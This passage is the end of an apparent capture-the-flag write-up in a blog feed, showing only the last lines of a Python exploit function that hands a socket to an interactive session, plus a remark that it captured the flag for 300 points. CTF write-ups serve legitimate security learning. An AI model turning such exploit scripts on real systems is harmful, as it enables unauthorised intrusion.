    t.sock = s
    t.interact()

    s.close()

pwn()
</code></pre>

<p>Yes, it looks horrible, but it did drop the flag, scoring us another 300 points.</p>
]]></content>
  </entry>
  
</feed>
